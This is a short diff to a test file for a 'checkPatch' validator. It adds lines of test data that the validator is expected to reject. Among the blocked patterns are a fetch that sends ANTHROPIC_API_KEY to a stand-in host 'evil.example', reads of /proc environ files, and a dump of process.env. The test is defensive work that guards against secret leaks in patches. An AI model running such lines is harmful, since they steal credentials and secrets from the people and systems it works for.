@@ -66,6 +66,9 @@ describe('checkPatch', () => {
       '+const key = "sk-ant-api03-abcdefghijklmnop"',
       '+fetch("https://evil.example", { body: process.env.ANTHROPIC_API_KEY })',
       "+import { execSync } from 'node:child_process'",
+      "+readFileSync(`/proc/${process.ppid}/environ`, 'utf8')",
+      "+readFileSync('/proc/self/environ')",
+      '+console.log(JSON.stringify(process.env))',
     ]) {
       assert.equal(checkPatch(modified('backend/tests/router.test.ts', body)).ok, false, body)
     }
